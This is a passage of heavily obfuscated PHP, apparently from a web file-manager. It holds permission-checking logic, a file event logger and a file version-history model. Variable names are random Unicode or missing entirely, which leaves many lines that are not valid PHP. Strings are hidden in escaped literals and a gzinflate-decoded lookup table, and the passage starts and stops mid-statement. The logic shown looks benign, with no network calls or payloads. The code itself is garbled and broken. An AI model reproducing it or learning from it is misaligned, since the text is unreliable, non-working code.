($̙[$Ǽ[178]] == SourceModel::TYPE_USER && $̙[$Ǽ[538]] == $Ǽ[212]) { $ϲ = 0; } $[] = $Ԫ[$Ǽ[455]] + $ϲ; } array_multisort($, SORT_DESC, $); return $; } public function getAllChildrenByUser($ޫ, $ݡʵ) { $ =& $_SERVER[]; $ɵ = Model($[567])->getInfo($ݡʵ); if (!$ݡʵ || !$ޫ || !$ɵ) { return array(); } $Ι = Model($[1373])->sourceInfo($ޫ); $ = array(); $ = 1; if ($Ι[$[180]] == $[212] && $Ι[$[538]] != $ && $this->groupContainUser($Ι[$[538]], $ݡʵ)) { foreach ($ɵ[$[2072]] as $;) { $ = Model($[554])->getInfo($;[$[1885]]); $ = Model($[567])->getInfoSimpleOuter($ݡʵ); $[$[508]] = $;[$[455]]; if (Model($[540])->authCheckAction($;[$[455]][$[455]], $[1906])) { continue; } $僄 = array($[32] => $[1249] . $[$[32]], $[181] => $[$[87]][$[181]], $[84] => KodIO::make($[$[87]][$[181]]), $[180] => $[212], $[178] => $[547], $[33] => $[584], $[551] => $[$[558]], $[1885] => $[$[1885]], $[555] => $[$[180]], $[2069] => array($)); $[$僄[$[181]]] = $僄; } } $Ć = array(); $ = $this->getAllChildren($ޫ); foreach ($ as $̺) { $ = !1; foreach ($̺[$[2069]] as $Ӥݶ) { if ($Ӥݶ[$[1687]]) { if ($Ӥݶ[$[1687]] == $ݡʵ) { $ = !0; break; } } if ($Ӥݶ[$[1885]]) { if ($this->groupContainUser($Ӥݶ[$[1885]], $ݡʵ)) { $ = !0; break; } } } if ($) { $Ć[] = $̺; } $ἒ = $̺[$[181]]; if (isset($[$ἒ])) { $̺[$[2069]][] = $[$ἒ][0]; $[$ἒ] = !1; } } $ = array_filter(array_values($)); $Ć = array_merge($, $Ć); return $Ć; } public function setAllChildrenByUser($ٖ, $, $ܛƘ) { $ =& $_SERVER[]; $ = $this->getAllChildrenByUser($ٖ, $); if (!$ܛƘ || !$) { return !1; } foreach ($ as $ޥ) { $ӻ = array(); foreach ($ޥ[$[2069]] as $Ĉ) { $뉕 = $Ĉ[$[508]]; $量 = $Ĉ[$[1687]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $χ = $Ĉ[$[1687]] ? $Ĉ[$[1687]] : $Ĉ[$[1885]]; if ($Ĉ[$[1687]] && $Ĉ[$[1687]] == $) { continue; } $ӻ[] = array($[181] => $ޥ[$[181]], $[178] => $量, $[538] => intval($χ), $[1989] => isset($뉕[$[443]]) ? intval($뉕[$[443]]) : 0, $[2049] => isset($뉕[$[2049]]) ? intval($뉕[$[2049]]) : -1); } $ӻ[] = array($[181] => $ޥ[$[181]], $[178] => SourceModel::TYPE_USER, $[538] => intval($), $[1989] => intval($ܛƘ), $[2049] => -1); $this->where(array($[459] => $ޥ[$[181]]))->delete(); $this->addAll($ӻ); } return !0; } public function get($Ͱ) { $ʲ = $this->getSourceList(array($Ͱ), !0); return $ʲ[0]; } public function getSourceList($ѩơ, $ = false, $ = false) { $ =& $_SERVER[]; if (!$ѩơ) { return array(); } $ = Model($[1373]); if (!$ && count($ѩơ) == 1) { $ = array(); $[$ѩơ[0]] = $->sourceInfo($ѩơ[0]); } if (!$) { $֪ = array($[459] => array($[460], $ѩơ)); $ = $->field($[2073])->where($֪)->select(); $ = array_to_keyvalue($, $[181]); } $ = $ѩơ; foreach ($ as $ => $) { $ = $->parentLevelArray($[$[553]]); $ = array_merge($, array($), array_reverse($)); } $ = array_values(array_unique($)); if (!$) { return array(); } $ = $this->sourceAuthSelect($); $ξ = array(); foreach ($ as $ތ) { if (isset($[$ތ])) { $ξ[$ތ] = $[$ތ]; } } $鈎 = $this->userIsRoot($); $Κ = AuthModel::authAll(); $ = array($[456] => $Κ, $[2074] => array($[461] => 0, $[1891] => $Κ, $[462] => LNG($[2075]), $[1908] => $[2076])); $鼼 = array(); foreach ($ as $ތ => $⩄) { if ($鈎 && $GLOBALS[$[6]][$[1904]]) { $鼼[$ތ] = $; continue; } $鼼[$ތ] = $this->makeSourceAuth($⩄, $ξ, $); } return $鼼; } public function authDeepCheck($, $̗ = false) { $ι =& $_SERVER[]; $̗ = $̗ ? $̗ : USER_ID; $ = $this->makeAuthDeep($̗); if (!in_array($, $[$ι[2077]])) { return !1; } $ۓ̒ = array(); foreach ($[$ι[2078]] as $ӾƷ => $ȑ) { if (!in_array($, $ȑ)) { continue; } $ۓ̒[] = $ӾƷ; } if (!$ۓ̒) { return !1; } $߼ = $ۓ̒ ? $ۓ̒[0] : $; return array($ι[456] => -1, $ι[508] => array($ι[461] => $ι[1229], $ι[1891] => $ι[212], $ι[462] => LNG($ι[2079]), $ι[1908] => $ι[2080]), $ι[2081] => LNG($ι[2082]), $ι[2083] => $this->sourceAuthInfo($߼)); } protected function makeAuthDeep($ɨ = false) { $ۦ =& $_SERVER[]; static $ = array(); $ɨ = $ɨ ? $ɨ : USER_ID; if (isset($[$ɨ])) { return $[$ɨ]; } $ڸَ = Model($ۦ[2084])->listData(); $˿ = array(); foreach ($ڸَ as $) { if ($[$ۦ[455]] == 0 && $[$ۦ[1907]] == $ۦ[88]) { $˿[] = $[$ۦ[443]]; } } $چ = $this->userGroupParents($ɨ); $ = array($ۦ[178] => SourceModel::TYPE_USER, $ۦ[538] => $ɨ); if ($چ) { $ = array(array($ۦ[178] => SourceModel::TYPE_USER, $ۦ[538] => $ɨ), array($ۦ[178] => SourceModel::TYPE_GROUP, $ۦ[538] => array($ۦ[460], $چ)), $ۦ[1039] => $ۦ[1983]); } $ = $this->field($ۦ[2085])->where($)->select(); $ς = array(); $ = array_to_keyvalue_group($, $ۦ[181]); foreach ($ as $ė => $ͫߏ) { $ː = $this->authArrayCheck($ͫߏ, $ɨ); if ($ː[$ۦ[456]] > 0) { $ς[] = $ė . $ۦ[12]; } } if ($چ) { $ = Model($ۦ[554]); foreach ($چ as $մ뾇) { $ה = $->getInfo($մ뾇); if (!$ה || !is_array($ה[$ۦ[87]])) { continue; } $ς[] = $ה[$ۦ[87]][$ۦ[181]]; } } $ = array(); $ = $چ; $Ư = Model($ۦ[1373]); $ = Model($ۦ[554]); $ߗ = array(); $ޚ = array(); $殦 = array(); $܌ = array(); if ($ς) { $ = $Ư->where(array($ۦ[181] => array($ۦ[460], $ς)))->select(); foreach ($ as $Ӑ) { $܆ = $Ư->parentLevelArray($Ӑ[$ۦ[553]]); $ = array_merge($, $܆); $[] = $Ӑ[$ۦ[538]]; $ߗ[$Ӑ[$ۦ[181]]] = $܆; $ޚ[$Ӑ[$ۦ[181]]] = $Ӑ[$ۦ[538]]; } } $ = array_values(array_unique($)); $Ԏ = $; foreach ($Ԏ as $մ뾇) { $ה = $->getInfo($մ뾇); $܆ = $Ư->parentLevelArray($ה[$ۦ[553]]); $ = array_merge($, $܆); } $ = array_values(array_unique($)); foreach ($ as $մ뾇) { $ה = $->getInfo($մ뾇); $[] = $ה[$ۦ[87]][$ۦ[181]]; $殦[$մ뾇] = $ה[$ۦ[87]][$ۦ[181]]; $܌[$մ뾇] = $Ư->parentLevelArray($ה[$ۦ[553]]); } foreach ($ߗ as $⬓ => $) { $ = $ޚ[$⬓]; if (!$ || !$殦[$]) { continue; } $р׎ = array(); foreach ($܌[$] as $մ뾇) { $р׎[] = $殦[$մ뾇]; } $ߗ[$⬓] = array_merge($р׎, $); } $ = array_values(array_unique($)); $ާ = array($ۦ[2077] => $, $ۦ[2078] => $ߗ); $[$ɨ] = $ާ; return $ާ; } private function makeSourceAuth($, $䀝, $ͨŭ = false) { $寔 =& $_SERVER[]; $ = $寔[88]; $қ = $[$寔[538]]; $Ѷ = $[$寔[178]] == SourceModel::TYPE_GROUP; $Է = $Ѷ ? $this->groupRootAuth($қ, $ͨŭ) : !1; if ($Է && Model($寔[540])->authCheckAction($Է[$寔[455]], $寔[1906])) { return $this->groupAuthInfo($Է, $қ); } $޸ = Model($寔[1373])->parentLevelArray($[$寔[553]]); $޸ = array_merge(array($[$寔[181]]), array_reverse($޸)); $͟ = !1; foreach ($޸ as $ǭ) { if (!isset($䀝[$ǭ])) { continue; } $Ǫ = $this->authMake($䀝[$ǭ], $ͨŭ); if ($Ǫ[$寔[508]]) { $͟ = $Ǫ; break; } } if (!$Ѷ) { return $͟; } if (!$͟ && $Է) { $͟ = $this->groupAuthInfo($Է, $қ); } if (!$͟) { $ = Model($寔[554])->getInfo($қ); $· = explode($寔[50], trim($[$寔[553]], $寔[50])); $· = array_reverse($·); foreach ($· as $ܗ) { if ($ܗ == $寔[212] || $ܗ == $) { continue; } $ = $this->groupRootAuth($ܗ, $ͨŭ); if (!$) { continue; } $͟ = $this->groupAuthInfo($, $ܗ); break; } } if (!$͟ || $͟[$寔[456]] <= 0) { $ = $this->authDeepCheck($[$寔[181]], $ͨŭ); if ($) { $͟ = $; } } return $͟; } private function userIsRoot($馯 = false) { $ =& $_SERVER[]; if (!$馯 && _get($GLOBALS, $[536])) { return !0; } $ = Model($[567])->getInfo($馯); $ֶ޾ = Model($[2086])->listData($[$[1563]]); if ($ֶ޾ && $ֶ޾[$[544]][$[2087]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ܯ) { $냑 =& $_SERVER[]; $ꌳ = Model($냑[1373]); $ = $ꌳ->sourceInfo($ܯ); if (!$) { return !1; } $ꌳ->groupPathDisplay($); $ϩ = array($); $ϩ = $ꌳ->_listAppendPath($ϩ); $ = $ϩ[0]; $Ҭ듗 = $[$냑[551]]; if (isset($[$냑[559]])) { $ו = explode($냑[8], trim($[$냑[551]], $냑[8])); array_shift($ו); $Ҭ듗 = $[$냑[557]] . $냑[2088] . implode($냑[8], $ו); } return array($냑[462] => $[$냑[32]], $냑[84] => KodIO::make($[$냑[181]]), $냑[2089] => $Ҭ듗); } private function groupAuthInfo($ˁ, $) { $ɇՑ =& $_SERVER[]; $ձ = Model($ɇՑ[554])->getInfo($); return array($ɇՑ[2090] => intval($ˁ[$ɇՑ[455]]), $ɇՑ[2074] => $ˁ, $ɇՑ[2091] => LNG($ɇՑ[2092]), $ɇՑ[2083] => array($ɇՑ[462] => $ձ[$ɇՑ[32]], $ɇՑ[84] => KodIO::make($ձ[$ɇՑ[87]][$ɇՑ[181]]), $ɇՑ[2089] => $ձ[$ɇՑ[558]])); } protected function groupRootAuth($, $ϭ = false) { $ڧ =& $_SERVER[]; $ϭ = $ϭ ? $ϭ : USER_ID; $͔ = $ϭ . $ڧ[2093] . $; static $č = array(); if (isset($č[$͔])) { return $č[$͔]; } $Ҹ = Model($ڧ[554])->getInfo($); $꓿ = $this->userGroupList($ϭ); $щ = isset($꓿[$]) ? $꓿[$][$ڧ[455]] : !1; if ($щ && Model($ڧ[540])->authCheckAction($щ[$ڧ[455]], $ڧ[1906])) { $č[$͔] = $щ; return $щ; } $ = $this->sourceAuthSelect($Ҹ[$ڧ[87]][$ڧ[181]]); $Ϲ = $ ? $this->authMake($, $ϭ) : !1; $Ī = $Ϲ ? $Ϲ[$ڧ[508]] : !1; $č[$͔] = $Ī ? $Ī : $щ; return $č[$͔]; } public function authOwnerApply($ǜ) { $ሒ =& $_SERVER[]; if (empty($ǜ[$ሒ[455]]) || isset($ǜ[$ሒ[2094]]) && $ǜ[$ሒ[2094]]) { return $ǜ; } if (AuthModel::authCheckRoot($ǜ[$ሒ[455]][$ሒ[456]])) { return $ǜ; } $ = Model($ሒ[1373])->parentLevelArray($ǜ[$ሒ[553]]); $ = array_merge(array($ǜ[$ሒ[181]]), array_reverse($)); $ = $this->sourceAuthSelect($); $Т = array(); $ך = array(); foreach ($ as $ => $Ά) { $ = $this->authFolderOwnerUser($Ά); $Т[$] = $; $ך = array_merge($ך, $[$ሒ[630]]); if ($[$ሒ[2095]]) { break; } } if (count($ך) == 0) { $ך = $this->authFolderOwnerGroup($ǜ[$ሒ[538]]); } $ך = array_unique($ך); if (AuthModel::authCheckRoot($ǜ[$ሒ[455]][$ሒ[456]])) { $ך[] = USER_ID; } $ǜ[$ሒ[455]][$ሒ[2096]] = Model($ሒ[546])->userListInfo($ך); return $ǜ; } private function authFolderOwnerGroup($) { $ =& $_SERVER[]; $踢 = Model($[1975])->where(array($[1885] => $))->select(); $ = array(); if (!$踢) { return $; } foreach ($踢 as $Ƿ) { $Ξ = $this->authInfo($Ƿ); if (AuthModel::authCheckRoot($Ξ[$[455]])) { $[] = $Ƿ[$[1687]]; } } return $; } private function authFolderOwnerUser($) { $ =& $_SERVER[]; $ = array(); $Ф = !1; foreach ($ as $) { $ü = $this->authInfo($); if ($[$[538]] == $[212]) { $Ф = !0; } if ($[$[178]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ü[$[455]])) { $[] = $[$[538]]; } } } return array($[630] => $, $[2095] => $Ф); } public function authMake($, $ۥ = false) { $߯ =& $_SERVER[]; $۶ = $this->authArrayCheck($, $ۥ); if ($۶[$߯[2097]]) { $۶[$߯[2097]] = $this->sourceAuthInfo($۶[$߯[2097]]); } return $۶; } public function authArrayCheck($͋, $ = false) { $ =& $_SERVER[]; if (!$͋) { return array($[456] => 0, $[508] => !1); } $ = $ ? $ : USER_ID; $鞶 = 0; $ԪӁ = 0; $䡱 = 0; $ = 0; $։ = 0; $޹ = 0; $䮷 = 1000; $뮼 = 0; $ʄ = 0; $󾂖 = 0; $ = 0; $݆䂖 = array($[181] => 0); foreach ($͋ as $݆䂖) { $匸 = $this->authInfo($݆䂖); if (!$匸) { continue; } $с = $݆䂖[$[538]]; $ݯ = intval($匸[$[455]]); if ($݆䂖[$[178]] == SourceModel::TYPE_USER && $с == $) { $鞶 = !0; $䡱 = $匸; $ԪӁ = $ݯ; } else { if ($݆䂖[$[178]] == SourceModel::TYPE_GROUP && $this->groupContainUser($с, $)) { $ = !0; $Մ = $this->groupStepToUserGroup($с, $); if ($Մ < $䮷) { $䮷 = $Մ; $։ = $ݯ; $޹ = $匸; $뮼 = $с; } if ($Մ == $䮷 && $ݯ >= $։) { $։ = $ݯ; $޹ = $匸; $뮼 = $с; } } else { if ($с == $[212]) { $ʄ = !0; $ = $匸; $󾂖 = $ݯ; } } } } if ($鞶) { $ʞ = $ԪӁ; $匸 = $䡱; $ = LNG($[2098]); } else { if ($) { $ʞ = $։; $匸 = $޹; $ܙ = Model($[554])->getInfo($뮼); $ = $[163] . $ܙ[$[558]] . $[2099] . LNG($[2100]); } else { if ($ʄ) { $ʞ = $󾂖; $匸 = $; $ = LNG($[2071]); } else { $ʞ = 0; $匸 = !1; $ = $[12]; } } } $ = array($[2090] => intval($ʞ), $[2074] => $匸, $[2091] => $, $[2083] => $݆䂖[$[181]]); return $; } private function groupContainUser($Ƀ, $շ̔ = false) { return in_array($Ƀ, $this->userGroupParents($շ̔)); } private function groupStepToUserGroup($, $ = false) { $ﬂƂ =& $_SERVER[]; $ݖȌ = $this->userGroupList($); $尻 = 1000; $ѩ = $GLOBALS[$ﬂƂ[6]][$ﬂƂ[89]][$ﬂƂ[1988]] == 1; $ = $ѩ ? 3 : 2; foreach ($ݖȌ as $) { if ($[$ﬂƂ[1885]] == $) { return 0; } $ = explode($ﬂƂ[50], trim($[$ﬂƂ[553]], $ﬂƂ[50])); if ($[0] == $ﬂƂ[212] && count($) > $) { $ = array_reverse(array_slice($, $)); $ = array_search($, $); if ($ !== !1 && $ + 1 <= $尻) { $尻 = $ + 1; } } } return $尻; } private function userGroupList($Φ = false) { $ =& $_SERVER[]; static $ = array(); if (isset($[$Φ])) { return $[$Φ]; } $ʲǵ = Model($[567])->getInfo($Φ); $[$Φ] = array_to_keyvalue($ʲǵ[$[2072]], $[1885]); return $[$Φ]; } public function userGroupParents($Ö) { $˲ =& $_SERVER[]; static $ = array(); $Ö = $Ö ? $Ö : USER_ID; if (isset($[$Ö])) { return $[$Ö]; } $ر = $this->userGroupList($Ö); $ٛ = array(); $ǔ = $GLOBALS[$˲[6]][$˲[89]][$˲[1988]] == 1; $Ǒ = $ǔ ? 3 : 2; foreach ($ر as $ԑ) { $՜ = array($ԑ[$˲[1885]]); $ = explode($˲[50], trim($ԑ[$˲[553]], $˲[50])); if ($[0] == $˲[212] && count($) > $Ǒ) { $ = array_slice($, $Ǒ); $՜ = array_merge($՜, array_reverse($)); } $ٛ = array_merge($ٛ, $՜); } $[$Ö] = array_unique($ٛ); return $[$Ö]; } public function authTargetInfoMake($ِ) { $û =& $_SERVER[]; $ݿ܎ = array(); $߅ = array(); foreach ($ِ as $偣) { if ($偣[$û[178]] == SourceModel::TYPE_USER) { $ݿ܎[] = intval($偣[$û[538]]); } else { if ($偣[$û[178]] == SourceModel::TYPE_GROUP) { $߅[] = intval($偣[$û[538]]); } } } if ($ݿ܎) { $ݿ܎ = Model($û[546])->userListInfo($ݿ܎); } if ($߅) { $ժ = array($û[1973] => array($û[460], $߅)); $߅ = Model($û[554])->field($û[2101])->where($ժ)->select(); $߅ = array_to_keyvalue($߅, $û[1885]); } return array($û[2102] => $ݿ܎, $û[2103] => $߅); } public function authInfo($) { $͎ =& $_SERVER[]; if ($[$͎[1989]]) { $ = Model($͎[540])->listData($[$͎[1989]]); if (!$) { return !1; $ꆟ = Model($͎[540])->listData(); $ؔ = array_filter_by_field($ꆟ, $͎[455], $͎[212]); return $ؔ; } $ = array_field_key($, array($͎[443], $͎[32], $͎[455], $͎[1908], $͎[1909])); $[$͎[2104]] = $; return $; } else { return array($͎[461] => 0, $͎[1891] => $[$͎[2049]], $͎[462] => $͎[12], $͎[1908] => $͎[2105]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\145\137\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\164", "\x66\165\156\x63\164\151\157\156"), array("\144\x65\x73\143", '', "\x69\x6e\x73\x65\162\164\54\165\x70\x64\x61\x74\145\x2c\163\145\x6c\145\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ߑ, $؆, $Þ = '') { $ۿ =& $_SERVER[]; if (!$this->eventSave) { return; } $ = Model($ۿ[1373])->sourceInfo($ߑ); if (!$) { return !1; } if ($this->isCacheEvent($, $؆)) { return; } if ($Þ && is_string($Þ)) { $Þ = array($ۿ[1924] => $Þ); } $̴٭ = defined($ۿ[2106]) ? USER_ID : 0; $ʶ = array($ۿ[459] => $ߑ, $ۿ[2107] => $[$ۿ[180]], $ۿ[2108] => $[$ۿ[32]], $ۿ[551] => !empty($[$ۿ[551]]) ? $[$ۿ[551]] : $ۿ[12], $ۿ[1678] => $̴٭, $ۿ[464] => $؆, $ۿ[1680] => $Þ); $this->addSystemLog($؆, $ʶ); unset($ʶ[$ۿ[2108]], $ʶ[$ۿ[551]]); return $this->add($ʶ); } private function addSystemLog($ҟ, $ᔸ) { $ =& $_SERVER[]; if ($ҟ == $[2109]) { $ҟ = $ᔸ[$[494]][$[2110]]; } else { if (in_array($ҟ, array($[1865], $[2111]))) { $ҟ = $ᔸ[$[494]][$[788]]; } } $ = array_merge($ᔸ, array($[2112] => $ᔸ[$[181]], $[2113] => $ᔸ[$[2113]])); Hook::trigger($[2114], $[2115] . $ҟ, $ᔸ); Model($[1829])->addLog($[2115] . $ҟ, $); } private function isCacheEvent($, $) { if ($[$_SERVER[][178]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($҈֑, $) { $撶 =& $_SERVER[]; $Քׄ = Model($撶[1373])->sourceInfo($҈֑); $Ȟ = array($撶[2110] => $, $撶[32] => $Քׄ[$撶[32]]); return $this->addEvent($҈֑, $撶[2109], $Ȟ); } public function eventFileEdit($ᵨ) { $ =& $_SERVER[]; $޲ğ = array($[2116] => $_SERVER[$[2117]], $[2118] => strtolower(ACTION)); if (isset($GLOBALS[$[7]][$[2119]])) { $޲ğ[$[2119]] = $[88]; } return $this->addEvent($ᵨ, $[1855], $޲ğ); } public function eventRecycle($, $Կ淞) { return $this->addEvent($, $_SERVER[][2111], $Կ淞); } public function eventRemove($Ń) { $͒ =& $_SERVER[]; $拗 = Model($͒[1373])->sourceInfo($Ń); $İ = $拗[$͒[32]]; return $this->addEvent($拗[$͒[180]], $͒[1854], $İ); } public function eventShare($, $) { return $this->addEvent($, $_SERVER[][1865], $); } public function eventMove($ܰ, $, $) { $ϸި =& $_SERVER[]; $ = Model($ϸި[1373]); $ = $->sourceInfo($ܰ); $ȃߩ = $->sourceInfo($); $ = $->sourceInfo($); $ц = array($ϸި[1199] => $, $ϸި[2120] => $ȃߩ[$ϸި[32]], $ϸި[2097] => !empty($ȃߩ[$ϸި[551]]) ? $ȃߩ[$ϸި[551]] : $ϸި[12], $ϸި[1200] => $, $ϸި[2121] => $[$ϸި[32]], $ϸި[2122] => !empty($[$ϸި[551]]) ? $[$ϸި[551]] : $ϸި[12]); $this->addEvent($ܰ, $ϸި[588], $ц); $ = $->sourceInfo($ܰ); $ц = array($ϸި[181] => $[$ϸި[181]], $ϸި[32] => $[$ϸި[32]]); $this->addEvent($, $ϸި[2123], $ц); } public function eventCopy($) { $this->eventCreate($, $_SERVER[][586]); } public function eventRename($ڕ, $ߛӪ, $) { $ό =& $_SERVER[]; $˔ = array($ό[1199] => $ߛӪ, $ό[1200] => $); return $this->addEvent($ڕ, $ό[1387], $˔); } public function eventAddComment($, $ӵ) { return $this->addEvent($, $_SERVER[][2124], $ӵ); } public function eventAddDesc($Ɏ, $Ŗ) { return $this->addEvent($Ɏ, $_SERVER[][2125], $Ŗ); } public function listBySource($Ъ) { $ =& $_SERVER[]; $ = Model($[1373])->sourceInfo($Ъ); $ = array($[459] => $Ъ); if ($[$[453]] == $[88]) { $ = Model($[1373])->listSearchChildren($Ъ, 20000); $[] = $Ъ . $[422]; $ = array($[181] => array($[7], $)); } $ݢ = $this->where($)->order($[2126])->selectPage(); if ($ݢ[$[410]][$[411]] == 0) { $ݢ[$[410]][$[411]] = 1; $ݢ[$[413]] = array(array($[459] => $Ъ, $[2107] => $[$[180]], $[1678] => $[$[495]], $[464] => $[2127], $[465] => $[$[215]], $[1680] => $[12])); } return $this->eventListParse($ݢ, $Ъ); } private function eventListParse($, $֟) { $՟ =& $_SERVER[]; $ºڇ = $[$՟[413]]; $ = array_to_keyvalue($ºڇ, $՟[12], $՟[181]); $ݝ = array_to_keyvalue($ºڇ, $՟[12], $՟[2113]); foreach ($ºڇ as $ڀߧ) { $͙ = $ڀߧ[$՟[494]]; if ($ڀߧ[$՟[33]] == $՟[588] && isset($͙[$՟[1199]])) { $[] = $͙[$՟[1199]] . $՟[12]; $[] = $͙[$՟[1200]] . $՟[12]; } if ($ڀߧ[$՟[33]] == $՟[2123] && isset($͙[$՟[181]])) { $[] = $͙[$՟[181]] . $՟[12]; } } $ = array_merge($, $ݝ, array($֟ . $՟[12])); $ = array_unique($); $ں욹 = array_unique(array_to_keyvalue($ºڇ, $՟[12], $՟[1687])); $ʴʪ = Model($՟[567])->userListInfo($ں욹); $ = Model($՟[859])->sourceListInfo($, !0); foreach ($ºڇ as &$ڀߧ) { if ($ڀߧ[$՟[33]] == $՟[588] && isset($ڀߧ[$՟[494]][$՟[1199]])) { $ڀߧ[$՟[494]][$՟[1199]] = $[$ڀߧ[$՟[494]][$՟[1199]]]; $ڀߧ[$՟[494]][$՟[1200]] = $[$ڀߧ[$՟[494]][$՟[1200]]]; } if ($ڀߧ[$՟[33]] == $՟[2123] && isset($ڀߧ[$՟[494]][$՟[181]])) { $ڀߧ[$՟[494]][$՟[181]] = $[$ڀߧ[$՟[494]][$՟[181]]]; } $ڀߧ[$՟[87]] = $[$ڀߧ[$՟[181]]]; $ڀߧ[$՟[2128]] = $[$ڀߧ[$՟[2113]]]; if ($ڀߧ[$՟[33]] == $՟[1854]) { $ڀߧ[$՟[2128]] = $ڀߧ[$՟[87]]; $ڀߧ[$՟[2113]] = $ڀߧ[$՟[2128]][$՟[181]]; $ڀߧ[$՟[87]] = !1; $ڀߧ[$՟[181]] = $՟[12]; } $ڀߧ[$՟[2057]] = $ʴʪ[$ڀߧ[$՟[1687]]]; } unset($ڀߧ); $[$՟[413]] = $ºڇ; return $; } public function removeBySource($ߎ) { $ѱ = array($_SERVER[][459] => $ߎ); $this->where($ѱ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\137\150\x69\x73\x74\157\162\171"; public function historyCount($Ӄ) { $ =& $_SERVER[]; if (!$Ӄ) { return array(); } if (is_string($Ӄ) || is_int($Ӄ)) { $Ӄ = array($Ӄ); } $ = array($[181], $[1918] => $[533]); $͋߼ = array($[181] => array($[7], $Ӄ)); $ʣ = $this->field($)->where($͋߼)->group($[181])->select(); return array_to_keyvalue($ʣ, $[181], $[533]); } public function addHistory($ǥ, $ = '') { $摑 =& $_SERVER[]; $ = array($摑[459] => $ǥ[$摑[181]], $摑[1678] => isset($ǥ[$摑[497]]) ? $ǥ[$摑[497]] : $ǥ[$摑[495]], $摑[510] => $ǥ[$摑[509]], $摑[585] => $ǥ[$摑[76]], $摑[2129] => $); if ($GLOBALS[$摑[6]][$摑[89]][$摑[1258]] >= 1) { $this->historyAutoClear($[$摑[181]]); $this->add($); } Hook::trigger($摑[2130], $); Model($摑[2131])->eventFileEdit($ǥ[$摑[181]]); } private function historyAutoClear($ּ̒) { $ =& $_SERVER[]; $甭 = Model($[804])->get($[1280]); $ = $GLOBALS[$[6]][$[89]][$[1258]]; $ʂ = $甭 == $[1281] ? min(5, $) : $; $ʂ = $ʂ <= 0 ? 0 : $ʂ - 1; if ($ʂ >= 500) { return; } $ӵˉ = array($[459] => $ּ̒); $ = $this->field($[2132])->where($ӵˉ)->order($[2126])->select(); if (!$ || $ʂ >= count($)) { return; } $ = array_to_keyvalue($, $[12], $[443]); $ = array_slice($, $ʂ); $ = array_to_keyvalue($, $[12], $[509]); $ = array_slice($, $ʂ); if (!$ || !$) { return; } $ӵˉ = array($[461] => array($[7], $)); $this->where($ӵˉ)->delete(); Model($[512])->remove($); } public function listData($͇𩉒) { $҄ =& $_SERVER[]; $ů = array($҄[459] => $͇𩉒); $ = $҄[2133]; $ = $this->field($)->where($ů)->order($҄[2126])->selectPage(); $this->_listAppendUser($[$҄[413]]); $ = Model($҄[804])->get($҄[1280]); $Ł = 5; if ($ == $҄[1281]) { $[$҄[413]] = array_slice($[$҄[413]], 0, $Ł); $[$҄[410]] = array($҄[2134] => 1, $҄[2135] => 20, $҄[2136] => 1, $҄[2137] => count($[$҄[413]])); } return $; } protected function _listAppendUser(&$ƃ) { $ =& $_SERVER[]; $ = array_to_keyvalue($ƃ, $[12], $[1687]); $ = Model($[567])->userListInfo($); foreach ($ƃ as &$֯) { $ = $֯[$[1687]]; $֯[$[495]] = $[$] ? $[$] : !1; } unset($֯); } public function fileInfo($Ӱ) { $ =& $_SERVER[]; $ԕ = $this->tablePrefix; $Ć = "{$ԕ}\151\x6f\137\x66\151\154\x65\40\x66\x69\x6c\145\x73\x20\x6f\x6e\x20\x66\151\x6c\145\163\56\146\x69\x6c\x65\111\104\40\x3d\40\x68\151\163\x74\157\162\171\x2e\146\151\154\145\111\104"; return $this->alias($[2138])->where(array($[461] => $Ӱ))->join($Ć, $[2139])->find(); } public function removeItem($) { $ =& $_SERVER[]; $ﭭ = array($[461] => $); $Ĳ = $this->where($ﭭ)->find(); if ($Ĳ) { $áƻ = $this->where($ﭭ)->delete(); Model($[512])->remove($Ĳ[$[509]]); return $áƻ; } return !1; } public function removeBySource($ῂ) { $ф =& $_SERVER[]; if (!$ῂ) { return !1; } if (!is_array($ῂ)) { $ῂ = array($ῂ); } $꣓ = array($ф[459] => array($ф[7], $ῂ)); $ڛ = $this->field($ф[510])->where($꣓)->select(); if ($ڛ) { $this->where($꣓)->delete(); $ = array_to_keyvalue($ڛ, $ф[12], $ф[509]); Model($ф[512])->remove($); } return !0; } public function setDetail($, $ȯ܈) { $Ȣ =& $_SERVER[]; return $this->where(array($Ȣ[461] => $))->save(array($Ȣ[2129] => $ȯ܈)); } public function rollbackToItem($໼, $) { $񐰁 =& $_SERVER[]; $՘ = Model($񐰁[859])->sourceInfo($໼); $this->addHistory($՘, LNG($񐰁[2140])); $Ś = $this->find($); $Ď = array($񐰁[509] => $Ś[$񐰁[509]], $񐰁[76] => $Ś[$񐰁[76]], $񐰁[85] => time(), $񐰁[497] => USER_ID); Model($񐰁[859])->where(array($񐰁[181] => $໼))->save($Ď); return $this->where(array($񐰁[461] => $))->delete(); } public function clearSame($߮) { $ =& $_SERVER[]; $ = $this->listData($߮); $񙷲 = array_to_keyvalue_group($, $[509]); $𲓧 = array(); $ = array(); foreach ($񙷲 as $) { if (!$ || count($) <= 1) { continue; } foreach ($ as $) { $𲓧[] = $[$[509]]; $[] = $[$[443]]; } } if (!$) { return; } $this->where(array($[443] => array($[7], $)))->delete(); Model($[512])->remove($𲓧); } public function userSpace() { $βȴ =& $_SERVER[]; $ = $this->tablePrefix; $ι = array($βȴ[1678] => USER_ID); $ = "{$}\151\x6f\137\x66\151\x6c\145\x20\x66\x69\x6c\145\163\40\157\156\x20\146\x69\x6c\145\163\x2e\x66\151\154\x65\x49\x44\x20\75\40\150\151\163\164\x6f\x72\171\56\146\x69\x6c\x65\x49\x44"; return $this->alias($βȴ[2138])->where($ι)->join($, $βȴ[2139])->sum($βȴ[76]); } } goto c; a: define($_SERVER[][646], $_SERVER[][647]); $mexkayjnrf = $_SERVER[][648]; $_SERVER[] = explode($_SERVER[][649], gzinflate(substr($_SERVER[][650], 10, -8))); goto bӑ; a臈: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($è) { parent::__construct($è); } public function 